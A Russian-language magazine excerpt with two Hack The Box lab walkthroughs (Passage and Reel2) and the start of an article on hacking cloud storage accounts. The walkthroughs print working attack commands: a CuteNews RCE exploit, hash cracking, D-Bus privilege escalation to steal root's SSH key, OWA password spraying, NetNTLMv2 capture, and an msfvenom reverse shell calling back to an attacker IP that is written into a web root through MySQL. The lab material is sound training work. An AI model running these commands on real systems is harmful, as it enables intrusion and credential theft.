ВЗЛОМ

      HTB
 PASSAGE





    ЭКСПЛУАТИРУЕМ RCE В CUTENEWS
     И ПОДНИМАЕМ ПРИВИЛЕГИИ
            ЧЕРЕЗ GDBUS





В этой статье мы пройдем машину Passage
с популярного сервиса Hack The Box и про‐
эксплуатируем  уязвимость в CMS Cute‐
News. Заодно научимся добавлять экспло‐
иты в базу Metasploit Framework, потрениру‐             RalfHacker                                                                                             hackerralf8@gmail.com
емся в поиске важных для развития атаки
файлов и узнаем, что такое D‐Bus и как
повысить   привилегии    с   помощью
USBCreator.


Подключаться  к лабора торной машине будем через VPN. Рекомендую
не подключаться с рабочего компьюте ра или с хоста, где есть важные
для тебя данные, так как ты попадешь в одну частную сеть с людьми, которые
что‐то да умеют в области ИБ. :)


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный в результате использования
                       знаний и методов, описанных в статье.



РАЗВЕДКА
Сканирование портов
Машина имеет IP‐адрес 10.10.10.206, который я добавляю в /etc/hosts,
чтобы можно было обращаться к хос ту по имени.


10.10.10.206    passage.htb

Лю бая  атака  начинается со  сканирования  открытых на  хосте портов.
Это необходимо для того, чтобы атакующий узнал, какие службы при нимают
соединение. Исходя из полученной информации, можно выбирать путь
для получения точки входа и опоры. Я это делаю с помощью следующего
скрипта, который исполь зует утилиту Nmap и принимает один аргумент —
адрес сканируемого хоста.
  Сначала скрипт исполь зует Nmap,  чтобы сделать обычное быстрое
санирование. Затем он парсит все порты из вывода и повторяет сканиро‐
вание только обнаруженных портов с использованием имеющихся скриптов
(опция ‐A).


#!/bin/bash
ports=$(nmap ‐p‐ ‐‐min‐rate= 500 $1 | grep ^[0‐9] | cut ‐d '/' ‐f 1 |
tr '\n' ',' | sed s/,$//)
nmap ‐p$ports ‐A $1





                    Результат работы скрипта

Мы имеем две службы — SSH (порт 22) и веб‐сервер Apache (порт 80).
На SSH нам ловить нечего, так как единственное, что там можно делать, —
это брутфорсить учетные данные. Брутфорс — пос леднее дело. Поэтому нам
остается искать точку вхо да на сайте. Перейдя на сайт, легко определяем
систему управления кон тентом — CMS CuteNews.





                        Powered by CuteNews


Точка входа
Первым делом стоит проверить, есть ли для обнаруженной CMS уже готовые
эксплоиты. Лучший способ это уста новить — поискать на сайтах вроде
HackerOne, exploit‐db, а также GitHub. Но если ты используешь специальный
дистрибутив вроде Kali Linux, то база экс плоитов Exploit‐DB уже у тебя на дис‐
ке. Для удобной работы с данной базой можно использовать ути литу search‐
sploit, также предустановленную в дистри бути ве. Именно с помощью ее мы
и находим ряд эксплоитов.


searchsploit cutenews




                  Экспло иты, найденные searchsploit

Так как мы не знаем версию CMS на атакуемом хосте, то следует выбрать
эксплоит для более поздней (2.1.2). Лучше всего для нас, если отработает
тот, который даст выполнение кода — RCE. Пометка Metasploit означает, что
этот эксплоит уже выпущен для Metasploit Framework.
   Суть эксплуатируемой уязвимос ти в том, что при изменении аватарки про‐
филя мы можем загрузить не только изоб ражение, но и файл с рас ширением
.php. К файлу затем можно обра титься, и это приведет к выполнению на сер‐
вере кода, содержащего ся в метаданных файла‐изображения.


ЗАКРЕПЛЕНИЕ
Так как в поставку Metasploit Framework этот экс плоит не входит, его нужно
добавить в базу. Для начала получим полный путь к файлу эксплоита (опция ‐
p позволит сохранить полный путь к файлу сра зу в буфер обмена), а затем
копируем в директорию с экспло итами.





         Добавление файла экс пло ита в Metasploit Framework

Авторы допустили ошибку: не хва тает запятой. Откроем файл эксплоита
и добавим ее, как указано на скриншоте ниже.





           Исправление ошибки в исходном коде эксплоита

В register_options содержатся параметры, с которыми запус кается экс‐
плоит. К примеру, в данном случае нам нужно знать путь к базовой дирек‐
тории CMS, а так же учетные данные пользователя.





                     Парамет ры экс плоита

В качестве значения параметра TARGETURI по умол чанию используется /
CuteNews. Перейдя к этой стра нице на сайте, получим форму авторизации.
Нам нужно зарегистрировать нового пользователя, именно его учетные дан‐
ные мы и будем исполь зовать при запус ке эксплоита.





                Форма авторизации CuteNews

Теперь, когда мы испра вили ошибки в экс пло ите и получили все необ‐
ходимые данные для его работы, командой reload_all обновим базу Metas‐
ploit Framework, чтобы загрузить только что добавленный эксплоит.


             Обновление базы Metasploit Framework

После успешного обновления базы загружа ем наш эксплоит, задаем зна‐
чения параметров и выполняем.


use exploit/46698
set username [ имя зарегистрированного пользователя]
set password [ пароль зарегистрированного пользователя]
set LHOST [ наш IP‐адрес]
set LPORT [ локальный порт для прослушивания]
set RHOSTS [ адрес цели]
run





  Подклю чение к хосту с помощью эксплоита в среде Metasploit Framework

В отчете наблюдаем успешные подключение, авто ризацию, загрузку файла
на сервер и запуск нагрузки, что в ито ге приводит нас к шел лу Meterpreter.
Командой getuid проверя ем, в контексте какого пользовате ля мы работаем.
В данном случае у нас контекст учетной записи службы веб‐сервера: поль‐
зователь www‐data.


ПРОДВИЖЕНИЕ
Credential Access
Так как на хосте развернут веб‐сервер, а на нем работает целая CMS, то пер‐
вое наше действие — попробовать получить какие‐нибудь пользовательские
учетные данные. Высока вероятность, что эти учетки подойдут и для локаль‐
ных пользователей тоже. В случае с CuteNews нас интересует директория /
cdata/users.





                Содержимое директории /cdata

Здесь должны находиться файлы users.txt и lines. Как раз второй пред‐
ставляет для нас интерес.



              Содержимое директории /cdata/users





                   Содержимое файла lines

Текст закодирован с помощью Base64. Немного преобразуем файл: исклю‐
чим из него все строки, которые содержат подстроку php (это позволит оста‐
вить только закодированные строки), и легко декодируем оставшиеся пря мо
в командной строке.


cat lines | grep ‐v php | base64 ‐d



               Декодирова ние строк из файла lines

В преобразован ном тексте есть упомина ние электронных почт и кое‐где даже
хешей паролей (обозначены s:64). Для их получения в удобном виде снова
используем конвейер.
 • Сначала получаем только строки, содержащие s:64 .
 • Затем разбиваем результат на новые строки по разделителю ; .
 • И вновь получаем только строки, которые включают либо подстроку s:64
   (хеш), либо подстроку @ (адрес электрон ной почты).


cat lines.txt | grep 's:64' | tr ';' '\n' | grep 's:64\|@'





   Получение хешей и соот ветству ющих им адресов электронной почты

Если ты не знаешь, какой алго ритм хеширования может вернуть такой хеш,
просто используй утилиту hashid. Эта программа покажет разные алгоритмы
хеширования, которые могут его вернуть. Самый популярный из предложен‐
ных в нашем случае — SHA‐256.





      Алгоритмы хеширования, предос тавлен ные программой hashid

Перед тем как запускать свои видеокарты и скармливать им этот хеш
для перебора, стоит поискать его в уже готовых онлай новых базах. Сервисов,
которые пре доставляют такую услугу, очень много. И первая же ссылка
из Гугла помогает нам с этим разобраться.





                  Поиск хеша в онлайн‐базах

Мы получаем один пароль, но и этого оказыва ется достаточно, так как он под‐
ходит для локального пользователя на удаленном хос те. Чтобы поменять
пароль, мало получить простой шелл, нам нужна оболочка TTY. В этом
поможет установ ленный Python.


python3 ‐c 'import pty;pty.spawn("/bin/bash")'
su paul





    Получение интерактивной обо лочки и смена пользователя на хос те

Так мы захватываем первого пользователя, а с ним и первый флаг — сви‐
детельство того, что мы получили контроль над машиной от име ни легитим‐
ного пользователя.


Ключевые файлы
У новичков иногда возникает вопрос, что же делать после того, как получил
шелл в системе, как найти путь, который приведет к повышению привиле гий.
Тебе в помощь скрипты PEASS — они есть и для Windows, и для Linux. Заг‐
рузим на локальный хост скрипт для Linux.


wget https://github.com/carlospolop/privilege‐escalation‐awesome‐
scripts‐suite/blob/master/linPEAS/linpeas.sh

Теперь нужно загрузить его на уда ленный хост. В директории со скриптом
на локальной машине запус тим с помощью Python простой веб‐сервер. Пос‐
ле выполнения этой команды веб‐сервер будет прос лушивать порт 8000.


python3 ‐m http.server

А теперь с помощью того же Wget на целевой машине загрузим скрипт
с локального хоста на удален ный. Пос ле загрузки необходимо дать право
на выполнение и выполнить скрипт.


wget http://[ip_локального_хоста]:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

В выводе получим очень мно го информации, поэтому стоит отметить важ‐
ную:
 • в списке процессов значится dbus, запущенный от имени пользовате ля
  nadav (к этому вернемся позже);
 • пользователь nadav имеет обо лочку /bin/bash, что позволит выпол нить
   вход от его имени, если у нас получится скомпро метировать его;
 • среди файлов, относящихся к SSH, при сутству ет файл known_hosts.




                      Список процес сов




                Список поль зователей с консолью




                   Найденные SSL/SSH‐файлы

Дело в том, что каждый раз, когда мы подключаемся по SSH к серверу, клиент
SSH проверяет, совпадает ли публичный ключ для этого сервера с тем,
который был прошлый раз. В OpenSSH список известных ключей серверов
хранится в файле known_hosts. То есть при наличии записи в known_hosts
мы можем подключиться к серверу без вся ких учетных данных. Давай поп‐
робуем подключиться по SSH к локальному хосту как второй пользователь.





                Содержимое файла known_hosts



               Авториза ция от имени пользователя nadav

Таким образом мы контролиру ем и вто рого юзера.


ЛОКАЛЬНАЯ ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ
Команда id подсказала нам, что пользователь находится в привилегирован‐
ных группах. Также вспоминаем, что D‐Bus — это система межпроцессного
взаимодействия, которая поз воляет приложениям в операционной системе
общаться друг с другом. Как правило, такое общение строится на основе
двух частей: демона и низкоуровневого API. D‐Bus предос тавля ет системе
несколько шин.
 1. Системная шина. Создается при старте демона D‐Bus. С ее помощью
   происходит общение демонов, а также вза имодействие пользовательских
   приложений с этими демонами.
 2. Сессион ная шина. Создается для пользователя, который авторизовал‐
   ся в системе. Для каждой такой шины запускается отдельная копия
   демона, через нее будут общать ся приложения, с которыми работает
   пользователь.

При запуске программа регистрирует один или несколько сервисов, которы‐
ми она будет владеть до тех пор, пока самос тоятель но не освободит. До это‐
го момента никакая иная программа, претендующая на тот же сервис, занять
его не сможет. Сер висы D‐Bus делают доступной еще одну функцию —
запуск необходимых программ, если для них поступят сооб щения.
  В домашней директории пользователя присутс твует файл .viminfo,
в котором упоминается USBCreator. Его же мы находим и в списке процес‐
сов. Это и есть путь к высоким привилегиям.





                  Содержимое файла .viminfo



         Наличие usb‐creator в спис ке запущенных процес сов

Путь повышения привилегий описан в статье Надава Маркуса. У нас есть все
необходимые составляющие для повторения его опыта: служба USBCreator
и членство в группе sudo. Уязвимость кроется в методе Image интерфейса /
com/ubuntu/USBCreator.





       Методы и сигналы в интерфейсе com.ubuntu.USBCreator

Сначала в этом методе проверяется, раз решен ли запрос данному поль‐
зователю. Так как целевой пользователь вхо дит в группу sudo, эта проверка
будет пройдена успешно. Для копирования данных в Image используется
реализация утилиты dd на Python.





                  Исходный код метода Image

Этот код будет выполнен в привилегиро ванном режиме, что позволяет нам
скопировать абсолютно любой файл. Лучше всего получить приватный ключ
SSH пользовате ля root. Для работы с D‐Bus будем использовать утилиту
gdbus со следующими аргументами:
 • call — коман да для вызова метода удален ного объ екта;
 • system — подключение к системной шине;
 • dest [] — имя объ екта, для которо го вызывается метод;
 • objectpath [] — путь к объекту, для которо го вызывается метод;
 • method [] — вызываемый метод;
 • перечисляются  аргументы  вызываемого  метода  (в  данном  случае
   это source, target и allow_system_internal ).


gdbus call ‐‐system ‐‐dest com.ubuntu.USBCreator ‐‐object‐path /com/
ubuntu/USBCreator ‐‐method com.ubuntu.USBCreator.Image /root/.ssh/id_
rsa /tmp/ssh.txt true




      Вызов метода Image для копирования при ватного ключа SSH

Теперь необходимо сохранить ключ в файл на локальном хос те, назначить
ему права и выпол нить подключение к удален ному хос ту.


chmod 0600 root.key
ssh ‐i root.key root@passage.htb




                                 root‐флаг

Итак, мы захватили машину и имеем над ней полный контроль.
ВЗЛОМ

         HTB
 REEL2





 ЗАХВАТЫВАЕМ МАШИНУ ЧЕРЕЗ OUTLOOK
    И РАЗБИРАЕМСЯ С ТЕХНОЛОГИЕЙ
      JUST ENOUGH ADMINISTRATION





В этой статье я покажу, как пройти машину
Reel2 с площадки Hack The Box, и на ее
примере мы поз накомимся с векторами
атаки  на  Outlook  Web  App,  научимся
генерировать  спи сок  паролей  из инфы             RalfHacker                                                                                             hackerralf8@gmail.com
о пользователе, поработаем с WS‐Manage‐
ment и поищем уязвимости в настройках
Just Enough Administration (JEA). Заодно я
покажу,  как  собирать  учетные  данные
на хос те, перенаправлять тра фик приложе‐
ния и делать шелл с помощью базы данных.


           WARNING

                     Подключаться к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                    жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Машина Reel2 имеет IP‐адрес 10.10.10.210 — я добавлю его в /etc/hosts,
чтобы можно было обращаться к хос ту по имени.


10.10.10.210    reel2.htb

Лю бая  атака  начинается со  сканирования  открытых на  хосте портов.
Это необходимо для того, чтобы узнать, какие службы принимают соеди‐
нение. Исходя  из  полученной информа ции, мы будем  выбирать  путь
для получения точки входа и опоры. Я это делаю с помощью следующего
скрипта, который исполь зует утилиту Nmap и принимает один аргумент —
адрес сканируемого хоста. Сна чала он выпол няет быстрое сканирование
портов, затем сканирует найденные порты с использовани ем имеющихся
скриптов.


#!/bin/bash
ports=$(nmap ‐p‐ ‐‐min‐rate= 500 $1 | grep ^[0‐9] | cut ‐d '/' ‐f 1 |
tr '\n' ',' | sed s/,$//)
nmap ‐p$ports ‐A $1





                    Результат работы скрипта

В результате сканирования имеем следующий список откры тых портов:
 • порт 80 — веб‐сервер Microsoft IIS 8.5;
 • порт 443 — обыч но еще один порт веб‐сервера, но с использованием
   SSL;
 • порт 5985 — этот порт отвечает за службу удаленного управления WinRM;
 • порты 6001...6021 — не интересу ют;
 • порт 8080 — веб‐сервер Apache.

Естественно, начинаем с веб‐сервера. Так, при обращении к корневому
каталогу веб‐сервера нас встречает стартовая стра ница IIS.





                   Стартовая стра ница Microsoft IIS


Перебор каталогов
У IIS есть несколько дефолтных катало гов (к при меру, /owa — Microsoft Out‐
look), но все рав но стоит просканировать дос тупные каталоги. Для этого мож‐
но использовать широко извес тные прог раммы dirsearch и DIRB, но я обычно
использую более быстрый gobuster. При запус ке используем следующие
параметры:
 • dir — сканирование директорий и файлов;
 • k — не проверять SSL‐сертификат;
 • t [] — количество потоков;
 • u [] — URL‐адрес для ска ниро вания;
 • x  [] — интересу ющие расширения файлов, перечисленные через
   запятую;
 • w [] — сло варь для перебо ра;
 • —timeout [] — время ожидания ответа.


gobuster dir ‐t 128 ‐u https://reel2.htb/ ‐k ‐w /usr/share/wordlists/
dirbuster/directory‐list‐lowercase‐2.3‐medium.txt ‐x html,php,aspx
‐‐timeout 30s





        Обнаруженные подкаталоги и фай лы на https://reel2.htb

В результате находим каталог owa.





               Панель авторизации Outlook Web App

На IIS мы нашли все что могли, а так как пользовательских веб‐приложений
не обнаружено, то перехо дим на веб‐сервер Apache.


OSINT
Порт 8080 вызывает больший интерес, так как на этом сайте мы можем
зарегистрироваться, а это даст доступ к дополнительным функци ям.





                  Панель авторизации Wallstant

Даже если сайт не име ет никаких уяз вимостей, он может содержать полезную
информацию. Например, имена пользователей, используемые технологии,
косвенную информацию для составления спис ка паролей. Поэтому сразу
после регистрации и авторизации останавлива емся на пользователях.





         Домашняя стра ница авто ризованного пользователя

Найти вектор для дальнейшей ата ки было тяжело, поэтому я решил перебрать
учетные данные Outlook. Для сос тавления спис ка паролей используем всю
косвенную информацию. У пользователя sven данных больше, чем у других.





                   Профиль поль зователя sven

Создадим для него список воз можных логинов. Комбинируя все возможные
сочетания имени Sven Svensson, мы можем соз дать следующий список.





                  Список имен учетных записей

Для создания паролей я поп робовал утилиту bopscrk. Суть программ такого
рода в том, что мы скармливаем им раз ные словари, последовательнос ти
символов или даже правила составления паролей, а они генерируют словарь
для брута. Как видно на скриншоте ниже, я ука зал значение следующих
параметров:
 • минимальная длина пароля — 6;
 • первое имя — sven;
 • второе имя — svensson;
 • релевантные сло ва через запятую — this, 2020, summer, hot;
 • использовать leet‐транскрипцию (когда, к примеру, буква е заменяется
   на цифру 3, g — на 9 и так далее) — отказыва емся;
 • использовать транскрипцию в разных регистрах — да;
 • количество слов для комбинирования — 3.

В итоге мы получаем словарь, содержащий 9204 вари анта пароля!





                 Результат работы утилиты bopscrk

В результате мы получили два файла для перебора учетных данных поль‐
зователя — с логинами и с паролями.


ТОЧКА ВХОДА
Брутфорс OWA
Если не знаешь, что использовать для брута, бери на заметку отличное
средство — SprayingToolkit. Этот тулкит включает в себя несколько модулей.
Нам нужен модуль Atomizer, который используется для брута Lync, OWA
и IMAP. Запускаем со следующими параметрами:
 • owa — для перебора Outlook Web App;
 • reel2.htb — корневой для катало га /owa адрес;
 • ~/tmp/bopscrk/tmp.txt — список паролей;
 • ~/tmp/user.txt — список логинов;
 • i [H:M:S] — временной интервал между запросами;
 • t [] — количество потоков.


python3 atomizer.py owa reel2.htb ~/tmp/bopscrk/tmp.txt ~/tmp/user.
txt ‐i 0:0:1 ‐t 64



                 Результат работы утилиты atomizer

Перебор занимает некоторое время, но все же находим верную пару учетных
данных. Atomizer сохранит все найденные учетные данные в файл owa_‐
valid_accounts.txt.





               Outlook Web App пос ле успешной авторизации


Похищение хеша NetNTLMv2
Этот вектор долго искать не пришлось — пос ле осмотра почтового ящика
был сделан выбор в пользу фишинга. В реальной жизни здесь работали бы
разные способы — к примеру, отправка офисных документов или HTML с наг‐
рузкой. В лабораторных усло виях это невоз можно, но существует эму ляция,
которая сработает, если отправить обычную ссылку. Рассылаем ее по всем
доступным адресам и ждем обращения к ресурсу. Во время его клиент авто‐
матически пре доставит для аутентификации хеш пароля NetNTLMv2.
  Мы сможем отловить этот хеш и при помощи брут форса получим пароль.
В качестве листенера, эмулирующего ресурс, исполь зуем утилиту Responder,
которой достаточно будет передать один параметр ‐I — сетевой интерфейс.


sudo responder ‐I tun0

Теперь выполняем многоадресную рас сылку, а в текст сообщения ставим
ссылку на любой файл, яко бы находящийся на нашем ресурсе. Спустя нес‐
колько секунд в окне Responder появится желанный хеш.





                    Рас сылка сооб щения в OWA





    Полученный в Responder хеш NetNTLMv2 пользователя k.svensson

Далее по плану ломаем хеш. Я для этих целей обычно использую hashcat,
но эта утилита требует указать тип хеша. К счастью, можно све риться
со  справкой —  выводим  примеры  хешей,  фильтру ем  по  слову
NetNTLMv2 и указываем найденный номер.


hashcat ‐‐example | grep ‐A 2 ‐B 2 NetNTLMv2




           Пример хеша NetNTLMv2, полученный в hashcat

Мы узнаем режим: 5600; к тому же нам показывают хеш, который визуально
по структуре похож на тот, что мы получили в Responder. Пришло вре мя кряк‐
нуть его!
  Для перебора будем использовать все тот же hashcat со сле дующими
аргументами:
 • a 0 — режим перебо ра, нулевой озна чает по словарю;
 • m [] — режим, тут ука зываем тип хеша, полученный ранее;
 • ksven.hash — файл, в котором записан хеш (хеши);
 • rockyou.txt — сло варь с возможными паролями.


hashcat ‐a 0 ‐m 5600 ksven.hash ./tools/rockyou.txt





                      Результат взлома хеша


ПРОДВИЖЕНИЕ
WS-Management
У нас есть учет ные данные пользователя Outlook, а это с высокой веро‐
ятностью учетная запись пользователя домена. В таком случае осталось
определиться со способом интерактивного управления машиной. Помнишь
открытый порт 5985? На нем по про токолу WS‐Management работает служба
удаленного управле ния. А получить интерактивную командную оболочку
поможет PowerShell Enter‐PSSession.


Enter‐PSSession ‐Computer 10.10.10.210 ‐Credential k.svensson
‐Authentication Negotiate





        Получение уда ленной сессии PowerShell Enter‐PSSession

Вот только выполнить стандартные команды не выходит. Набираем command,
чтобы посмотреть, что мы можем сделать.





          Доступные команды PowerShell для текущей сессии

Но и это не проблема, так как мы можем исполь зовать PowerShell ScriptBlock,
а именно конструкции вида &{команда}. В качес тве подтверждения того, что
мы захватили пользователя, получаем файл user.txt.



        Выполнение команд с помощью PowerShell ScriptBlock



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB REEL2

             ЗАХВАТЫВАЕМ МАШИНУ ЧЕРЕЗ OUTLOOK
                И РАЗБИРАЕМСЯ С ТЕХНОЛОГИЕЙ
                       JUST ENOUGH ADMINISTRATION





Just Enough Administration (JEA)
Нужно осмотреться на хос те, чтобы найти вектор для продвижения. К при‐
меру, в текущей директории находим файл Windows PowerShell Session
Conﬁguration.





                  Листинг директории Documents

Технология Just Enough Administration (JEA) поз воля ет делегировать адми нис‐
тративные полномочия на все, чем можно управлять с помощью PowerShell,
и дать пользователям пра ва на выполнение определенных административных
задач, не предоставляя им пра ва администратора сервера или службы.
С помощью JEA можно указать, каким пользователям разрешено запускать
определенные командлеты, функции или скрипты PowerShell с правами при‐
вилегированных пользователей, а также подробно логировать все действия
(вроде истории команд).
  Давай разберемся с jea_test_account.pssc.





             Содержимое файла jea_test_account.pssc

 1. Директива SessionType имеет значение RestrictedRemoteServer,
   что позволит исполь зовать следующие командлеты PowerShell: Clear
  Host, ExitPSSession, GetCommand, GetFormatData, GetHelp,
  MeasureObject, OutDefault и SelectObject (их мы уже видели
   в выводе команды command текущего пользователя).
 2. Параметр TranscriptDirectory закомменти рован, а в нем указывается
   директория, в которую сохраня ются логи.
 3. Опция RunAsVirtualAccount позволяет запускать команды от име ни
   виртуального аккаунта администра тора (члена локальной группы или Ad‐
    ministrator, или Domain Admin).
 4. В директиве RoleDefinitions нуж но указать группу безопасности AD,
   для которой разрешено подключать ся к данной сессии PowerShell, и наз‐
   вание роли JEA, которое должно соответс твовать име ни фай ла PSRC.

Теперь перейдем к файлу PowerShell Role Capabilities, который содержит опи‐
сание роли. В нем указывается, что раз решено делать в рамках сес сии JEA.
В нашем случае там определена функция Check‐File, которой нужно
передать путь к файлу в качестве аргумента, и если он соответс твует одной
из масок D:\* или C:\ProgramData\*, то в результате будет воз вращено
содержимое файла.



             Содержимое файла jea_test_account.psrc

Теоретически мы можем получить любой файл из этой директории, так
как команда выполнится с привилегиями админис тратора, но необходимо
решить две проблемы:
 • путь к файлу соот ветствует одной из масок;
 • необходима сессия jea_test_account.

Первая проблема лег ко решается использованием ссы лок. Мы можем
закинуть файл‐ссылку в папку ProgramData, а ука зывать он будет на дирек‐
торию админа. Для решения вто рой проб лемы нуж но искать информацию
на хосте, вероятно в катало гах текущего поль зователя, так как файлы кон‐
фигурации сессии тестового пользователя тоже расположены у текуще го
юзера.


Credentials dumping
Обращаем внимание на ярлык  Sticky Notes (при ложе ние для заметок)
на рабочем столе поль зователя. Sticky Notes хранит пользовательские дан‐
ные в директории AppData\Local\stickynotes. И в логах находим учетные
данные нужного нам пользователя.





              Ярлык Sticky Notes в директории Desktop





         Содержимое директории AppData\Local\stickynotes





              Учетные данные пользователя jea_test_account

Как и планировали, создаем ссылку на директорию адми на.


New‐Item ‐ItemType Junction ‐Path 'C:\ProgramData\Admin' ‐Target 'C:\
Users\Administrator'

А  теперь вернемся  в  локальную  консоль и  создадим новую  сессию
jea_test_account.


$username = "jea_test_account"
$password = ConvertTo‐SecureString "Ab!Q@vcg^%@#1" ‐AsPlainText
‐Force
$creds = New‐Object System.Management.Automation.PSCredential
‐ArgumentList  ($username, $password)
Enter‐PSSession ‐Computer 10.10.10.210 ‐credential $creds
‐ConfigurationName jea_test_account ‐Authentication Negotiate

В новой сессии выпол ним разобранную ранее функцию, чтобы забрать файл
админа и подтвердить прохождение машины.


                Получение флага администра тора

На данном этапе прохождение машины можно считать законченным. Но... Я
так и не получил контроль над ней, поэто му продолжаем!


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Credentials dumping
Я решил поискать учетные данные дальше. Существует место, где они есть
всегда, — файлы с настройками для подключения к базе данных. Если мы
получим админскую учетку, мы запишем шелл в директорию веб‐сервера
и выполним его от имени System. Нужно найти этот файл, а как прочитать, мы
уже знаем. Сайт, на котором мы регистри рова лись, построен на CMS Wall‐
stant, которую мы находим на GitHub. И в директории сonfig будет лежать
файл connect.php с нужными нам настройками.





                Содержимое файла connect.php

Остается узнать путь к корневой директории CMS в xampp. Так как сайт рас‐
положен на порте 8080, то это будет отмечено в конфигурационном файле
веб‐сервера xampp\apache\conf\httpd.conf, а в директиве DocumentRoot
будет указан путь к кор невой директории сай та. Давай линканем директорию
C:\xampp от имени первого пользователя.


New‐Item ‐ItemType Junction ‐Path 'C:\ProgramData\xampp' ‐Target 'C:\
xampp\

А теперь перейдем к сессии тес тового юзера и просмотрим этот файл кон‐
фигураций.


check‐file c:\programdata\x ampp\a pache\c onf\h ttpd.conf




         Содержимое файла конфигура ций httpd‐vhosts.conf

Теперь, зная корневую директорию social, смот рим файл connect.php. В нем
обнаруживаем учетные данные, которые мы искали.





                Содержимое файла connect.php


Обратный шелл на PHP
Теперь сге нерируем PHP‐шелл, который будем выполнять в контексте служ‐
бы. В случае с PHP мож но легко сгенерировать шелл с помощью msfvenom
со следующими параметрами:
 • p [] — используемая нагрузка (конечно, берем Meterpreter);
 • LHOST=[] — IP‐адрес локального хос та;
 • LPORT=[] — локальный порт;
 • f [] — формат, в котором будет представлена нагрузка.


msfvenom ‐p php/meterpreter_reverse_tcp LHOST=10.10.14.45 LPORT= 4321
‐f raw > r.php
cat r.php | xclip ‐selection clipboard && echo '<?php ' | tr ‐d '\n'
> r.php && xclip ‐selection clipboard ‐o >> r.php

И запустим листенер, который будет ожидать обратного подключения от наг‐
рузки. Для быстрого запус ка из metasploit используем handler с парамет‐
рами, указанными при создании нагрузки.


handler ‐p php/meterpreter_reverse_tcp ‐H 10.10.14.45 ‐P 4321




                       Активация модуля handler


Порт-форвардинг
Чтобы подключиться к базе данных, лучше всего пересылать весь трафик
с порта сервера на порт локального хос та (Port Forwarding), сде лать что‐то
вроде тоннеля. Для это го будем использовать chisel. Эту программу нужно
будет загрузить на хост. Кидаем в одну директорию chisel.exe и сгенери‐
рованный PHP‐шелл, а потом запус каем простень кий веб‐сервер.


python3 ‐m http.server

Эта команда откроет веб‐сервер, который будет слу шать порт 8000. А с уда‐
ленного хоста загрузим и программу, и шелл, при чем шелл сразу в дирек‐
торию C:\ProgramData.


&{wget 10.10.14.45:8000/chisel.exe ‐O chisel.exe}
&{wget 10.10.14.45:8000/r.php ‐O C:\programdata\r .php}

Работать с chisel очень прос то, мы запускаем утилиту на двух устройствах
следующим образом.
 1. При запуске на локальном хос те указыва ем, что являемся сервером, ука‐
   зываем порт и опцию ожидания подключения от клиента.


   ./chisel.bin server ‐p 4321 ‐‐reverse



    Сообщение об ожидании подклю чения на порт 5432 на сервер chisel

 2. На хосте‐клиенте указываем соответству ющую опцию, а также адрес
   и порт сервера для подклю чения. Затем идет последовательность,
   которая  означает,  что  порт  3306  сервера  будет  связан  с  пор‐
   том 3306 локального хос та.


   &{ .\chisel.exe client 10.10.14.45:4321 R:3306:127.0.0.1:3306}



             Сообщение о подключении на клиенте chisel




          Сообщение об активации сес сии на сервере chisel


Шелл через БД
Теперь, используя встро енный клиент MySQL, подключимся к базе данных.
При подклю чении используем следующие аргументы:
 • h [] — хост для подключения (коннектимся к локальному, так как соеди‐
   нение будет ретранслировать ся на удален ный);
 • u [] — пользователь;
 • p [] — имя базы данных;
 • password=[] — пароль;


mysql ‐h 127.0.0.1 ‐u root ‐p Wallstant ‐‐password= Gregswd123FAEytjty

После подключения нужно записать наш шелл в директорию веб‐сервера.
Алгоритм действий прос той:
 1. Создаем таблицу.
 2. Создаем в таблице запись, которую считыва ем из файла с шел лом.
 3. Эту запись пишем в файл на веб‐сервере.


create table phpshell (line blob);
insert into phpshell values(load_file('/programdata/r.php'));
select * from Wallstant.phpshell into dumpfile '/xampp/htdocs/social/
r.php';

После помещения файла на сервер обратимся по URL http://10.10.10.
210:8080/r.php. Это приведет к активации шел ла и получению сессии Meter‐
preter. На скриншоте ниже видно сообщение о подключении и активации сес‐
сии. Командой sessions  ‐i  1 мы переходим к созданной сессии и с
помощью getuid убеждаемся, что работа ем в контексте System с максималь‐
ными привилегиями.





     Получение сессии Meterpreter с максимальными привиле гиями

Таким путем мы захватываем Reel2 и имеем над ней полный контроль.
ПРИВАТНОСТЬ





       БОЛЬШЕ
 НЕ ТВОИ
      ДОКУМЕНТЫ

  КАК ВЫГЛЯДЯТ ОБЛАЧНЫЕ ХРАНИЛИЩА
          ГЛАЗАМИ ХАКЕРА





Сервисы вроде Dropbox или Megaupload —
удобное изобретение: можно всегда иметь
под  рукой нужные документы. Но если
не   заботиться  о   безопасности,   то
это удобство обернется  утечкой важных             Kolchanoff                                                                           На самом деле писать статьи
личных данных. В этой статье я наглядно       оченьклавиатурупросто.и Садишьсяначинаешьза
покажу, как облачные хранилища и фай‐         m.kolchanoff@gmail.comхлестать кровью.
лообменники  превращаются  в  объекты
хакерских атак, позволяют похитить важные
документы и собрать матери ал для шан‐
тажа.


           WARNING

                  Материал носит ознакомительный характер и не
                      призывает нарушать неприкосновенность частной
                     жизни. Несанкционирован ный доступ к информа‐
                      ции  уголовно  наказуем.  Автор  и  редакция
                      не несут ответствен ности за любой вред, при‐
                       чиненный с использованием информации из этой
                         статьи или в попытках повторить описанные дей‐
                          ствия.


Владельцы  крупных файлообменников  совершенс твуют  защиту  данных
и обычно предлагают двухфакторную аутентификацию, но вариант с обыч‐
ными логином и паролем по‐прежнему дос тупен и широко используется.
Играет ли это на руку хакерам? Определен но.
  Способов взлома мно го: фишинг, сти леры, перебор пароля и даже
высокотехнологичные атаки на провайдеров и операторов сотовой связи,
когда перехватывают коды подтверждения. Но чаще всего применяется
метод credential stuﬃng — когда для вхо да исполь зуются учетные данные
из утекших баз. Люди ведь не любят придумывать разные пароли для разных
сервисов, а менеджер паролей пока так и оста ется технологией для прод‐
винутых пользователей.


ПОЧЕМ ЧУЖИЕ ПАРОЛИ?
Конечно же, учетными данными активно торгуют в злачных угол ках интернета.
Я обошел пять таких местечек, что бы изу чить предложение и цены. В среднем
они такие:
 • 300–350 дол ларов  за миллион комбинаций  логин‐пароль или  поч‐
   та‐пароль;
 • 400–500 долларов за миллион комбинаций из корпоративных почтовых
  ящиков и паролей к ним. Потенциально это наиболее лакомый кусочек
   для мошенников;
